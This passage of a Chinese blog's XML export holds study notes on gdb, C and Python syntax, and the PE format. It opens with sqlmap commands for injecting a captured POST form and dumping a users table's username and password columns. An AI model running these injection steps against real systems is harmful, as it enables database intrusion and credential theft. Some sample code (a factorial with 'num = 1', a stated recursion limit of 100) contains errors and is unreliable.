    <content type="text"><![CDATA[用 sqlmap 执行 POST 表单的注入 用 Burp Suite 截取表单，保存为 test.txt 根据username字段进行注入，目标为得到数据库列表 1sqlmap -r test.txt -p username --dbs 选择一个数据库，猜表 1sqlmap -r test.txt -p username -D userdb --tables 猜列 1sqlmap -r test.txt -p username -D userdb -T users --columns 猜数据 1sqlmap -r test.txt -p username -D userdb -T users -C "user,password" --dump]]></content>
      <tags>
        <tag>sqlmap</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[gdb_base]]></title>
    <url>%2F2017%2F09%2F21%2Fgdb%2F</url>
    <content type="text"><![CDATA[打开比如有一个first.c文件，用gdb来调试 1. 编译源文件1gcc -g -o first first.c -o : 设置生成的输出文件名。这里是first.out-g : 让编译器将符号表（对应于程序的变量和代码行的内存地址列表）保存在生成的可执行文件中。这样才能在调试会话过程中引用源代码中的变量名和行号。 2. 打开gdb1$ gdb first 帮助信息123helphelp breakpoint 显示breakpoint类的help信息help info 显示info的用法 开始运行12(gdb) r(un)(gdb) start 开始运行并停在main函数的第一行前。 执行语句n 单条语句执行s 步进c 继续运行 设置断点123info b(reak) 查看断点信息b(reak) 16 在源程序第16行处设置断点b(reak) func 在函数func()入口处设置断点 查看查看源代码(gdb) l(ist)只会输出最多10行。想列出更多，按l或者enter即可。 查看变量p i 打印变量i的内容(支持命令x的显示格式) 查看内存/地址1info line 查看源代码在内存中的地址 参数可以是：行号，函数名， 1p win 查看函数的地址 1x (examine) 查看内存地址中的值 格式： x /nfu addr n 一个正整数，表示需要显示的内存单元的个数 f 显示的格式x十六进制 d十进制 o八进制 t二进制 c字符格式 u十六进制显示无符号整型 u 设置显示时一个内存单元的大小默认4bytes b单字节 h双字节 w四字节 g八字节 addr 指定的内存地址 例子12x/3uh 0x54320 显示0x54320处的内存情况x/xw &amp;a 显示变量a的地址处的内存情况 查看寄存器12345(gdb) i r 同 info register(gdb) i r a 查看所有寄存器（包括浮点、多媒体）(gdb) i r esp(gdb) i r pc(gdb)p $ebp 显示ebp内容 查看堆栈12345bt 查看栈帧(stack frame)f 1 选择帧1，这时你可以查看该函数的信息。info f 显示栈的地址等信息info args 显示当前函数的参数及其值info locals 显示函数的局部变量 1234567891011info f 显示的信息(举例)：a. 当前桢的地址: 0x7fffffffdca0b. 下一条指令: eip = 0x4005b9c. 当前桢函数：test (test.c:6)d. caller桢的PC: saved eip 0x40067fe. caller桢的地址: called by frame at 0x7fffffffdcf0或者 f. caller桢的地址: caller of frame at ......g. 源代码所用的程序的语言(c/c++): source language ch. 当前桢的参数的地址及值: Arglist at 0x7fffffffdc90, args: name=0×8048621 “jessie”, myname=0x804861c “jack”i. 当前相中局部变量的地址：Locals at 0x7fffffffdc90, Previous frame’s sp is 0x7fffffffdca0k. 当前桢中存储的寄存器： Saved registers: ebp at 0x7fffffffdc90, eip at 0x7fffffffdc98 查看汇编代码1234disass(emble) 查看汇编代码set disassembly-flavor intel 将汇编代码的语法转换为intel 而不是默认的A&amp;T(换回来时用att)layout asm 显示汇编代码的窗口 其他x/20i $pc 显示程序计数器的内容]]></content>
      <tags>
        <tag>linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[c语言基础语法]]></title>
    <url>%2F2017%2F09%2F19%2Fc-base%2F</url>
    <content type="text"><![CDATA[记一下 C 语言的一些基本语法，以供参考。 编译型语言：源代码经过编译器的编译，生成可执行文件。如C语言 解释型语言(脚本语言)：将源代码转化为中间代码(比如，再发送给解释器，由解释器逐句翻译给cpu执行。跨平台特性好，但是每一次执行都要解释。如python,ruby,java 数据类型 基本类型： 整数(int)，浮点类型(float,double)，字符类型(char)，布尔类型(_Bool)，枚举类型(enum) 指针类型 构造类型：数组类型，结构类型，联合类型 空类型 sizeof()sizeof 运算符，查看参数占内存多少位e.x. sizeof(变量名) sizeof(类型) sizeof(对象) signed &amp;&amp; unsignedint类型默认为signed存放 signed int 类型的存储单元中，第1位为符号位，为0表示数据为正数，为1表示是负数unsigned int a 表示变量a只能为正数。 unsigned的所有位都是用来存放数据的。 补码计算机通过补码来存储负数。正数的补码就是其二进制数。 负数的补码： 先取得其绝对值的二进制形式 除了符号位为1，将其他位按位取反 将取反后的值+1 数据类型取值范围(下面是signed的取值范围，unsigned的范围就是相同范围的正数) char 1bytes -2^7^~2^7^-1 short 2bytes -2^15^~2^15^-1 int 4bytes -2^31^~2^31^-1 long 4bytes(32位系统) long long 8bytes -2^63^~2^63^-1 float 4bytes 10^-38^~10^38^ double 8bytes 10^-308^~10^308^ long double 12bytes 同上 Format String Parameters %d 整数 %u 打印无符号的整数 %c 字符 %x 16进制整数 (无”0x”) %f 浮点数。float和double 都可以用。%.2f表示精确到小数点后2位。 %p 内存地址 常量通常用宏定义#define来定义一个常量。 如 #define URL &quot;http://www.example.com&quot; 也可用关键字 const 定义常量如const float pi = 3.14 字符串常量用#define 定义了字符串常量后，在编译时编译器会自动在其末尾加上’\0’作为结束符。 字符内存中用ASCII码存储字符。12printf("%d",'C') #67printf("%c",67) #C 注意：char 默认为unsigned还是signed是由系统或编译器自己决定的。 如果你将char类型作为数字的容器，若为signed容易给结果带来错误 char a[4] = &quot;haha&quot;;打印a[4] ， 会发现出现乱码。因为这个字符串4个单位全部被填满，没有\0，所以会一直读取。解决方法： 这样定义的时候至少要留出一个单位。 中括号内不填数字，让编译器或系统自动分配。 scanf的一个注意点12scanf("%c",&amp;a)scanf("%c",&amp;b) 输入 y 回车 n 回车 之后，a , b的值分别为多少？a为’y’，b为’\n’解决方法：在两条语句中间加一个 getchar() 运算符+ 加法 : ‘a’+’b’ 表示97+98/ 除法 : 对于整数操作数，采取舍弃小数，不会四舍五入% 求余 : 要求两个参数必须是整数，不能为浮点型&amp;&amp; 逻辑与 : 只要左边式子不成立(为0)，右边的式子它就不会再运行|| 逻辑或 : 只要左边式子成立(为1)，右边的式子就不会运行 当两个不同类型的数字相加时，编译器会将占空间较小的换成占空间较大的类型。然后再相加。或者你可以用int()等函数进行强制类型转换 数组初始化的几种方法123int a[10] = &#123;1,2,3,4,5,6,7,8,9,10&#125;int b[10] = &#123;1,2,...n&#125; //为前n个赋值,其余10-n个都为0int c[10] = &#123;[3]=3,[5]=5,[8]=8&#125; //只给下标3,5,8赋值，其余都为0 二维数组二维数组其实就是一维数组的线性扩展int array[4][5]就是在内存中连续给出4个位置，每个位置占5个int类型数据。 多维数组也如此 函数定义123void func_name()&#123; void:函数返回类型。不返回数据就写void ()内填参数和类型。 ... ...&#125; 指针指针变量存放地址声明：char *pa; int *pb; 较普通变量的声明前多了一个星号 指针变量的类型：表示指针指向的数据类型。因为不同类型数据所占内存空间不同，通过指针取得数据的时候需要根据类型判断取几个内存单元 &amp; 取地址运算符，获取一个变量的地址如 int *pa = &amp;a * 取值运算符，获取一个指针变量指向的数据如 *pa+=1 一个未被赋值的指针变量会由系统随机分配内容。若利用这个指针向内存写入数据，会造成安全漏洞。 通过指针修改变量的内容1234int a ;int *p = &amp;a;scanf("%d",p); //p中存放a的地址printf("a=%d",a); 指针变量的加减若将一指针p指向一数组， p+1 则指向数组下一个元素++(注意不是简单地将地址加1)++p是什么类型的指针，p+1保存的地址就加对应类型的大小 数组和指针的关系数组名存放数组下标0的地址。定义一个指针 char *s = &quot;haha&quot;; 我们可以用 *s[0] , *s[1] 来访问里面的字符。但是，并不能将数组和指针混为一谈。数组名保存的内容是不可修改的。而指针，你可以修改它的内容，让它指向不同位置。 指针数组123int *p[5] = &#123;&amp;a,&amp;b,&amp;c,&amp;d,&amp;e&#125;; // []优先级大于 * //存放指针的数组。*p[1] //取变量b的内容 二维数组如 int array[4][5] 针对上面这个例子，我们定义两个名词： 小数组，里面存放5个单位的int数据 大数组，里面存放4个小数组 array可以看作是指向 大数组中第一个元素 的指针。即指向int类型数组的指针一个int数据4个字节。 array+1 跨越了20个字节 *array 表示 array[0] 这个数组。 *(array+1) 表示array[1] 这个数组*(*array) 取array[0][0] *(*array+1) 取array[0][1] array，其实就是一个数组指针 数组指针int (*p)[5] p是指向 有5个int单元的数组 的指针 int定义的是数组中元素的类型，p指针的类型是 int[5] 初始化以前我们将一个指针指向数组是这么做的：12int a[5] = &#123;1,2,3,4,5&#125;;int *p = a; 指针指向 数组第一个元素，即指向一个int数据但 数组指针 指向一整个数组，而不是一个int数据。所以这样初始化： int *p = &amp;a; (变量a为一个一维或多维数组)*p 表示第一个数组。 *(*p) 取第一个数组的第一个元素 *(*(p+1)) 取第二个数组的第一个元素 二维数组的数组名可以赋值给数组指针。12int array1[4][5] ;int (*p)[5] = array1 ; void指针void指无类型， 我们不能用它来定义变量然而，void可以定义指针，称为通用指针。它可以指向任何类型的数据。我们不确定指针指向的数据类型的时候，就可以用它。但是读取void指针指向的内容就有麻烦，因为系统不知道该取多长的内存单元(但是指向字符串的void指针没问题，只需要一直往下读，知道遇到’\0’停止就好)不过，void指针过多会让阅读代码更难，所以我们一般在指向之后再对其强制类型转换。如 (int *) p NULL指针上面说过，定义一个指针却不让它指向一个地址，就会被系统随机分配一个地址，造成危险。所以当你还不知道指针指向哪的时候，可以定义它为NULL指针。这样万一你引用了它，就会出现段错误。int *p = NULL; 指向指针的指针我们定义了一个字符串数组，由于字符串就是一个指向第一个字符的指针，所以我们用指针来访问它们，需要用指针的指针123char *sentence[ ] = &#123;"qwe","asd","zxc"&#125;;char **select = &amp;sentence[1];printf("I select %s from sentences.\n",*select); 二维数组与指针的指针12array[2][3]=&#123; &#123;1,2,3&#125; , &#123;4,5,6&#125; &#125;;int **p = array; 这个指针p是否与上面的数组指针作用相同？不一样。 C语言将array赋值给p的时候只知道array是一个指针。 而不知道array的结构。 p 与 p+1 的地址只相差 4byte。同理，我们在定义 二维数组 的时候，行数可以不写，C语言会自己算。但是列数不能不写。这就是C语言不够智能的地方。所以，要指向2维数组，只能用数组指针。 指向常量的指针12const int cnum = 10;const int *p = &amp;cnum; //不加上const会报错 指针p不是一个常量，可以修改指针p的指向(指向的数据不一定得是const int，也可以是int)。const int 修饰指针指向的目的地，所以不可以通过这个指针，修改指向的值(无论指向变量还是常量)。 常量指针12int num =10;int * const p = &amp;num const 修饰p，不可以修改指针p的指向。int修饰指针指向的值，所以可以通过这个指针 修改指向的目的地。而且这个指针 指向常量会报错 函数一般我们都知道函数的实参与形参的关系：函数内对形参的操作不会影响到实参。函数内的变量称为局部变量。函数调用完成后，局部变量消失。 指针作为形参1void test( int *x , int *y ) 用指针作为形参，对形参的操作会影响实参 数组作为形参12void test(int a[10]) //声明 (其中10可以省略)test(a) //调用 这里传递的不是整个数组，而是数组的第一个元素的地址。函数中对形参数组的操作同样会影响main中的实参数组。 指针函数返回指针的函数比如我们要让函数返回一个字符串。而字符串我们一般用 char * 来声明。所以我们是否也能这样定义一个函数呢？123456char *getString(char input)&#123; switch(input)&#123; case 'A': return "Apple"; default:return "None"; &#125;&#125; 函数指针一个指向函数的指针声明的区别： 指针函数 int *p() 函数指针 int (*p)() e.x. 比如我们现在有一个函数，接收int，计算其平方123int square(int a)&#123; return a*a;&#125; 现在我们在main()函数中用 函数指针 来指向它。123456int (*fp)(int)//前面的int表示指针返回int类型。括号里的int表示指向的函数以int作为参数fp = square;//函数名相当于函数的地址。 这里在square前加上 &amp; 也可行printf("%d" , fp(5));//通过指针调用函数，计算5的平方。 一般为了代码更好阅读，fp(5)应该写成 (*fp)(5) 函数指针作为参数比如我们现在有两个函数：add和subadd 接收2个int，返回其和。sub接收2个int，返回其差。现在我们定义一个函数calc()，接收3个参数。参数1为函数指针。参数2、3为两个int。它即可以调用add函数，又可以调用sub函数12345678int calc(int (*fp)(int,int) , num1 , num2)( return (*fp)(num1 , num2);)// 在main函数中调用这个函数printf("%d" , calc(add,5,3)); //8printf("%d" , calc(sub,5,3)); //2 函数指针作为返回值比如我们写一个名为select的函数，接收1个符号，返回一个函数指针。如何写这个函数的声明？比如接收一个+，就返回add函数，接收-，就返回 sub指针12345678910111213int (*select(char op))(int , int)&#123; // 考虑括号优先级。int (*fp)( int , int) 我们知道，fp是一个函数指针。 //select(char op)取代fp，表示这是一个函数select()，它的返回值是函数指针。 switch(op)&#123; case "+" : return add; case "-" : return sub; &#125;&#125;//然后在main函数里int (*fp)(int , int);fp = select(op); //定义函数指针用来接收返回的函数printf("%d",calc(fp,5,3)); 这样，当op为+时，结果是8，当op是-时，结果是2 结构体比如我们要表示一本书的信息，它包含书名、作者、售价、出版日期等，我们如何表示？一个比较好的方式就是结构体。它能将 不同类型的数据 混合存放到1个变量中去。12345678910111213141516171819202122//定义struct Book&#123; //建议将结构体变量的首字母大写 char title[40]; char author[40]; float price; unsigned int date;&#125;; //此处分号不要忘记//声明变量struct Book book1;//初始化变量struct Book book2 = &#123; "Head First C", "David Griffiths" "99.0" 20130901&#125;;book2.title; //访问成员struct Book book3 = &#123;.title = "Head First Java"&#125;; //根据成员名字初始化 结构体嵌套123456789101112131415// 上面的程序中 Date 用 int 表示，有点不妥。// 这里我们用结构体来表示。struct Date&#123; int year; int month;&#125;;struct Book&#123; char title[40]; char author[40]; float price; struct Date date;&#125;;// 结构体嵌套后，赋值时有几层嵌套就要用几个 "." 结构体 数组/指针12345struct 结构体名称&#123; 结构体成员;&#125;;struct 结构体名称 数组名[长度]; 123struct Book * ptr;ptr = &amp;book; 访问结构体指针的 2 种方法： (*ptr).成员 括号不可省略 ptr-&gt;成员 (常用) 如果我们要将 结构体 作为参数，传递给函数，不推荐直接传递，而应该用 结构体指针。因为 结构体 有时候内容非常大，直接传递消耗资源较多。 链表12345678910111213struct Test&#123; int x; int y struct Test test;&#125;// 上面的代码是错误的，这样写会陷入无限循环。struct Test&#123; int x; int y; struct Test *test;&#125;// 上面的代码是成立的。 第3个成员指向另一个 struct Test 变量。这就是“链表” 链表中最简单的是 单链表。其每个节点分为 信息域 和 指针域。指针域一直指向下一个链节点，直到指向NULL为止。它还需要一个头节点，来指向第一个链节点 内存分布text data bss(一般用来存放未初始化的全局变量)可以用 size 命令查看一个可执行文件的 text , data , bss 段的大小。 栈一般存放程序的 局部变量、参数、函数返回值。栈的生存周期从 函数调用 开始，到 函数返回 结束。函数间的局部变量不能互相访问。 堆由程序员动态控制。堆的生存周期由动态申请开始，到程序员主动释放结束。不同函数之间均可自由访问。]]></content>
      <tags>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python基本语法]]></title>
    <url>%2F2017%2F09%2F10%2FlearnPy%2F</url>
    <content type="text"><![CDATA[Python的一些基本语法，以便参考 查看帮助查看本地文档1234#模块print(module_name. __doc__)#函数help(func_name) print(func_name.__doc__) 或者可以在终端输入1python -m pydoc -p 1234 这样你就可以在浏览器的 localhost:1234 查看python文档了 Web文档https://docs.python.org/3/index.html 查看内置函数123dir(__builtins__) #自带内置函数(BIF built-in functions)dir(module_name) #某模块的内置函数dir(list) #“列表”的内置函数 使用一个数据类型前应该看看Python提供的内置函数，免去不必要的费时 查看模块的可调用方法用dir()查看部分模块，会有一个__all__属性 ， module_name.__all__ 查看即可发现此模块中所有可被外界调用的方法。当我们使用 from module_name import *时，被引入的也只有这些可被调用的方法。 几条书写规则一行代码可以分多行书写 ， 在行尾加上 \注释符： #多行注释 ： ‘’’ [content] ‘’’ 字符串(str)常用方法详见 dir(str) Format string1234print( " %d + %d = %d " % (a,b,c) )"&#123;0&#125; love &#123;1&#125;".format('I','you') #显示 "I love you""&#123;b&#125; love &#123;a&#125;".format(a='you',b='I') #显示 "I love you" 原始字符串 (raw sting)在字符串前加上字母r，那么该字符串就会被认为是原始字符串，即没有任何转义的字符串。12345print('C:\now') # c: # nowprint(r'C:\now') # C:\now 检查输入内容Python中的接受键盘输入函数 input()一律将输入转换成 str 类型。则检查输入是否合法就依靠检查字符串的内容 建议查看 dir(str) ， 使用 isdigit() 、 isalpha()等内置判断函数 列表(list)一个列表中可以存储多种类型的数据 添加元素 append() extend() insert() 去除元素 remove() pop() del 语句 常用操作符+ 连接2个列表* 重复列表in / not in判断元素是否在列表中列表的copy已有列表 list1 ， 想要 copy 一份，应该怎么做？list2 = list1错误。 这样的话修改 list1，list2同时会被改变。list2 = list1[:] 正确 列表推导式12a = [i for i in range(100) if not(i%2) and i%3] #[3, 9, 15, 21, 27, 33, 39, 45, 51, 57, 63, 69, 75, 81, 87, 93, 99] 元组(tuple)权力越大，越有可能出问题。列表虽然很灵活，但容易出现问题。因此出现了更稳定的类型 ： 元组。元组不允许修改其中的元素。123tuple1 = ()tuple2 = (1 , )tuple3 = 1 , 2 我们知道列表最标志性的是中括号 [ ] ，那元组最标志性的是小括号吗？不，是逗号 ,从 tuple2 , tuple3 的定义可以看出，如果写成 tuple2 = (1) 那么类型是 int 更新元组如何更新元组？如在 temp = (1,2,3,5,6,7) 中按顺序插入一个 “4”1temp = temp[:3] + (4,) + temp[3:] #切片仍然用中括号 原来的数据由于没有变量指向它，会被python回收器清除掉 字典(dict)字典，是python中唯一的映射类型。 其内容按照 key-value 对进行索引。 创建字典character = [ e , t , a , o , i , n , s , h , r , d ]frequency = [ 12.70 , 9.06 , 8.17 , 7.51 , 6.97 , 6.75 , 6.33 , 6.09 , 5.99 , 4.25 ]12345678910111213141516171819 #直接创建frequency_table1 = &#123;'e':12.70 , 't':9.06 , 'a':8.17 , 'o':7.51&#125;frequency_table2 = dict(e=12.7,t=9.06,a=8.17,o=7.51) # key 不加引号 #动态创建dict1 = &#123;&#125;dict['name'] = 'Alice'dict['age'] = 'twenty'... ... #fromkeys 为所有key赋同一个值fre_table = &#123;&#125;fre_table = fre_table.fromkeys( ('e','t','a') , 10) #赋值操作必须有，不然只是生成了字典而没有索引 #字典推导式a = &#123;i:i%5 for i in range(10)&#125; #&#123;0: 0, 1: 1, 2: 2, 3: 0, 4: 1, 5: 2, 6: 0, 7: 1, 8: 2, 9: 0&#125; 访问项目12345678910dict1[key] #上面的方法在key不存在的时候会报错。推荐一种更优雅的方法：dict1.get(key) #此方法在当key不存在时默认返回None。 可设置参数2来返回其他消息dict1.keys() #返回字典中的所有键dict1.values() #返回字典中的所有值dict1.items() #返回字典中的项x in dict1 #用 in , not in 判断value是否在dict1中 修改项目12345frequency_table1['e'] = 13.70 #清除 dict 内容dict1.clear() #不推荐用 dict1 = &#123;&#125; ，若别的变量引用 dict1可能会出现引用错误 排序由于本身的特性，字典是不能被排序的。要想按照 key 或者 value 排序，需要先将 dict 转换成可排序的类型(如 list , tuple)，在它们身上进行排序操作。123456789 #该方法返回一个 list，其元素为 tupleimport operatorx = &#123;1: 2, 3: 4, 4: 3, 2: 1, 0: 0&#125; #按 key 排序sorted_x = sorted(x.items(), key=operator.itemgetter(0)) #按 value 排序sorted_x = sorted(x.items(), key=operator.itemgetter(1)) 集合(set)集合中不存在重复的元素。集合是无序的，你不能索引它。 创建集合12345678 #1. 直接将一堆元素用花括号括起来set1 = &#123;1,2,3,4,5&#125; #2. 使用工厂函数 set(),用 list 等作为参数set1 = set([1,2,3,4,5]) #3. 集合推导式set1 = &#123;i*2 for i in range(10)&#125; # &#123;0, 2, 4, 6, 8, 10, 12, 14, 16, 18&#125; 可以查看dir() 来获得更多关于 set 的方法。 不可变集合1frozenset() #尝试修改不可变集合会报错。 函数(function)lambda123456def fc1(x,y): return 2*x+3*yfc1(2,3) # 13fc2 = lambda x,y : 2*x+3*yfc2(2,3) # 13 变长参数在函数的形参前加个 *，那么所有多余的参数就会作为元组，存储在该形参中。1def func(*args) 这样一来，该函数就可以接收变长参数了。 如果除了变长参数外，你还想传入其他参数，则需要用 名字索引，不能再用 顺序索引。我们看 print() 的 help 文档，可以看出它的参数也是变长的。 函数中的全局变量函数中操作的变量都是 “局部变量” ，即使其名字与全局变量相同。如果真的要在函数中修改全局变量，可以用 global 关键字 2 useful BIF recommendation12345filter() 筛选器，用左边函数筛选出右边的参数中满足的部分map() 将左边的函数作用于右边的所有数可以通过 help() 查看它们的参数。它们都返回一个对象，可用list()获得输出 迭代，递归迭代(iteration)每一次过程的重复我们称为 “迭代” 而每一次迭代的结果都会作为下一次的初始值 迭代器(iterator)如字符串、字典、文件等。 迭代函数最主要的方法有2个： iter() next()1234567891011121314&gt;&gt;&gt; str = 'abc'&gt;&gt;&gt; x = iter(str)&gt;&gt;&gt; x&lt;str_iterator object at 0x7f4d05d696a0&gt;&gt;&gt;&gt; next(x)'a'&gt;&gt;&gt; next(x)'b'&gt;&gt;&gt; next(x)'c'&gt;&gt;&gt; next(x)Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;StopIteration for 循环的工作原理，大致与此相同。在遇到 StopIteration 前，一直调用 next() 构造 Iteration 12345678910111213141516 #实现输出 Fibonacci 数列 #构造 Iterator 最主要的是实现 __iter__() 以及 __next__() 魔法方法class Fibs: def __init__(self): self.a = 0 self.b = 1 def __iter__(self): return self def __next__(self): self.a , self.b = self.b , self.a + self.b return self.afibs1 = Fibs()for each in fibs1: print(each) 顺便提一下 生成器由于 Iterator 比较麻烦，构造的时候需要实现一个类。生成器与一般函数的区别，即关键字 yield 。Python用生成器这个概念来实现 协同函数的功能。 协同程序是可以运行的独立函数。函数可以暂停或挂起，并在需要的时候从程序离开的地方继续或从新开始。 1234567891011121314151617&gt;&gt;&gt; def myGen():... print('haha')... yield 1... print('xixi')... yield 2... &gt;&gt;&gt; my = myGen()&gt;&gt;&gt; next(my) #生成器是特殊的迭代器。可以用 next()haha1&gt;&gt;&gt; next(my) #第二次调用，从 yield 2 处开始执行xixi2&gt;&gt;&gt; next(my)Traceback (most recent call last): File "&lt;stdin&gt;", line 1, in &lt;module&gt;StopIteration 生成器推导式我们知道，list , dict , set 都有推导式。但是元组有吗？123&gt;&gt;&gt; a = (i for i in range(10))&gt;&gt;&gt; a&lt;generator object &lt;genexpr&gt; at 0x7f4d035392b0&gt; 得到的却是 generator。 递归(Recursion)递归，可以简单地理解为函数调用自身。 python 默认规定递归的最大深度为100层。如果你想写爬虫且爬得比较深的话，100层是不够的。你可以自己设置最大深度。12import syssys.setrecursionlimit(2000) #深度过大可能有危险 递归示例 ：求阶乘123456def factorial(num): if num = 1: return 1 #1.必须要有终结点 else : return num*factorial(n-1) #2.调用自身 #缺少以上2点中的任何一点，都不能算是有效递归 递归的缺点由于递归每次调用自身都需要 压栈、弹栈 等，时间与空间上的消耗比较大。如果计算量较大，迭代会比递归快很多。且python中有递归深度的限制，将参数留给用户，容易报错。 文件 主要用到 open()函数 建议先查看 help(open) ，熟悉其中参数 123f = open('test.txt') #返回一个文件操作对象 #默认mode 'rt' 主要的文件对象方法有1234567f.close() 关闭文件对象f.read(size=-1) 读取size个字符。未指定或者为负值时，读取剩余全部字符f.readline()f.write()f.writelines(seq) seq是一个可迭代的返回字符串的对象f.seek(offset,from) 在文件中移动文件指针，从from(0为文件开头，1为当前位置，2为末尾)偏移offset个字节。f.tell() 返回当前在文件中的位置 参数mode 读取以file_data为对象，可以调用 read() 方法123456f.readline() #读取一行，包括\nf.readlines() #把整个文件内容按行分割，存到列表 a 中#如果想把文件中的内容逐行打印，官方有种推荐方法for each_line in f: print each_line 写入123456789101112f = open('test.txt','w')#如果文件已存在，原内容会被清空#写入二进制文件 ’wb‘ 追加写文件 ’w+‘f.write('text')#如果需要换行，则加上“\n”f.writelines()#用一个列表作为参数，可以将列表内的每个参数一行一行输入到文件中f.close()#读写之后，关闭读写对象是个好习惯。 文件系统每个操作系统的文件系统都各不相同，意味着操作的代码也不尽相同。但Python是一个跨平台语言，它提供了 os 模块，帮我们解决问题。123456os.getcwd()os.listdir()os.mkdir() os.makedirs()os.remove() 删除文件os.rmdir(&quot;p&quot;)删除空目录 os.removedirs(&quot;p1/p2&quot;)递归删除空目录os.system() 除此之外还有一个 os.path 模块，里面也有一些好用的方法 123 #参数：要遍历的目录(起始目录)os.walk("/var/www")os.walk("C:" + os.sep + "abc") 输出：三元tuple dirpath,dirnames,filenames dirpath为string，代表起始目录 dirnames为list，包含dirpath下所有子目录的名字 filenames为list，包含所有文件的名字(不包含路径)。如果要得到绝对路径,可以用 os.path.join(dirpath,name) 分析大文件当我们读取一个比较大的文本文件，比如几个G的日志文件，直接将其全部拖入内存不可行，需要用readlines()方法来一次处理小部分 先打开文件file=open(‘logfile’,’r’)然后定义一次读取的size大小，这里是200Msize= 209715200lines=readlines(size) 正则表达式(RegEx)常用匹配符12345. 任何字符(除了换行符)\d 0～9的数字 \D 任何非数字\w 字母数字 \W 任何非字母数字\s 空格,等价于[\n\t\r\f] \S 任意非空格字符^a 匹配作为字符串开头的a字母 z$ 匹配作为字符串末尾的z字母 集合用中括号创建一个匹配元素的集合12[aeiou] 匹配任意一个元音字母 [0-9] 匹配任意一个数字[a-z] 匹配任意一个小写字母 [a-zA-Z] 任意一个字母 匹配次数12345678用大括号表示匹配的次数ab&#123;3&#125;c 匹配abbbcab&#123;3,&#125;c 匹配a和c间 至少 有3个b的字符串ab&#123;3,10&#125;c 匹配a和c中有 3～10 个b的字符串* 匹配前面的子表达式(即用小括号括起来的)零或多次+ 匹配前面的子表达式一或多次？ 匹配前面的子表达式零或一次 或 非用 | 表示匹配左边的模式或者右边的模式[^0-9] 匹配数字外的任意字符 分组像数学式子一样，用小括号将表达式分组。让你更好地理清关系，也不至于看起来麻烦12匹配一个IP地址(考虑到数字范围为0-255)((\d|\d\d|1\d\d|2[0-4]\d|25[0-5])\.)&#123;3&#125;(\d|\d\d|1\d\d|2[0-4]\d|25[0-5]) 匹配函数1234567891011121314151617import re #构造 pattern时建议在前面加个 r 使其变为原始字符串re.search(pattern,str) #用于在字符串中搜索正则表达式第一次出现的位置re.match(pattern,str) #只从开始匹配。如果字符串的开始不符合正则表达式，则匹配失败re.findall(pattern,str) #将成功匹配的所有子串作为一个列表返回 #或者pattern1 = re.compile('[a-z]') #将 a-z 作为 patternresult = pattern1.findall('fnaw%$vr17%g*9oi')# 从括号内的字符串中找出符合 pattern 的值，返回一个列表# 这个方法与 result=re.findall('[a-z]','fnaw%$vr17%g*9oi') 相同，不过这种写法在同一个 pattern 被用多次的时候比较方便。 提取匹配结果re.search 和 re.match 函数在匹配成功后都返回一个 match对象。要将匹配到的数据提取出来，需要用到 group() 123456import rea = "123abc456"print re.search("([0-9]*)([a-z]*)([0-9]*)",a).group(0) #123abc456,返回整体print re.search("([0-9]*)([a-z]*)([0-9]*)",a).group(1) #123print re.search("([0-9]*)([a-z]*)([0-9]*)",a).group(2) #abcprint re.search("([0-9]*)([a-z]*)([0-9]*)",a).group(3) #456 其他功能生成伪随机数:import randomrandom.randint(1,10) 生成1~10之间的随机整数random.randrange(1,10) 同理 random.seed(&quot;hello&quot;) 给伪随机数设置一个 previous value，如果设置的值不变，那么设置后程序产生的伪随机数序列也不变。 判断对象类型：12type() #输入变量，输出其类型isinstance() #输入变量和目标类型，返回bool值 查看数据的ID在python中指针的概念不明确，但是却会有指针导致的错误。比如 b=a ，然后修改a的内容，b的内容不会被修改。id() 返回变量所指向的数据的ID，用来查看]]></content>
      <tags>
        <tag>code</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PE]]></title>
    <url>%2F2017%2F08%2F21%2FPE%2F</url>
    <content type="text"><![CDATA[主要是对PE文件做一些大概的介绍。 PE (Portable Excutable可移植执行体) 格式是win32所有可执行文件都使用的格式。 “可移植” 指的是 即使 Windows 运行在非 Intel 的 CPU 上，任何 win32 平台的 PE 装载器都能识别和使用该文件格式 前言PE 文件结构简介PE 文件使用平面的地址空间，所有代码和数据都合并在一起，组成一个很大的结构。 区块(section)文件被分成很多个 区块，其中包含代码或者数据。每个区块都有自己在内存中的属性，如 只读，可读写。一般我们遇到的以下 区块 的含义是： .text 在编译或汇编结束时产生的一种块，内容全是指令代码。 .data 初始化的数据块 .rdata 程序运行期间的只读数据 .idata 外来 DLL 的函数以及数据信息，即 输入表 .rsrc 资源。比如 图标、菜单 等 .bss 未初始化数据 区块按照 页 来对齐，区块没有大小限制，是一个连续的结构。 入口点(Entry Point)PE文件在执行时的第一行代码的地址就是 “入口点”。 文件偏移地址PE文件存储在磁盘时，各数据的地址称为文件的 “偏移地址”。文件的偏移地址从文件的第一个字节开始计数，起始值为 0。 虚拟地址(virtual address,VA)由于 Windows 运行在保护模式下，所以应用程序访问的是 “逻辑地址”，也叫 “虚拟地址”，又称 “内存偏移地址”(Memory Offset)。 我们经常能看到在不同的电脑中运行相同的程序其同一条指令的地址是相同的，这个地址其实是 虚拟地址。 基地址(Image Base)文件执行时被映射到 指定内存地址中，这个初始内存地址称为 “基地址”，在 PE文件 的 IMAGE_OPTIONAL_HEADER32 结构中设定。 用 Visual C++ 生成的 EXE 文件基地址是 0040 0000H , DLL基地址 是1000 0000H 。这个值可以自己在编译器中设定。 相对虚拟地址 (RVA)RVA是 Relation Virtual Address 的缩写。它是一个相对地址。PE文件中的各种数据结构中涉及地址的字段大部分都是以RVA表示的。它的值为 PE 文件被装载到内存中以后，某个数据位置相对文件头的偏移。某数据的RVA计算法方法 ： 该数据的地址 - 文件的开头地址 数据结构的定义PE文件的结构定义在 winnt.h 头文件中。 在计算机中搜索一般都能搜到。用编辑器打开，然后搜索结构名，就能看到数据结构的定义。 PE文件中的数据结构一般都有 32位 和 64位之分，一般会在名称中表现出来。比如 IMAGE_NT_HEADER32 和 IMAGE_NT_HEADER64 64位版本知识对32位进行了一些扩展，结构几乎一模一样。 PE文件到内存的映射系统运行一个可执行文件并不是直接将其整个加载到内存中(物理内存也吃不消)。 Windows装载器在装载的时候仅仅建立好虚拟地址和PE文件之间的映射关系 (相当于放到虚拟内存中)。当真正执行到某个内存页中的指令或访问某一页的数据时，这页才会被从磁盘加载到物理内存中。 文件中较高的偏移地址被映射到较高的内存地址中。“映射” 表明 PE文件的 内容的布局 在磁盘中和在内存中是 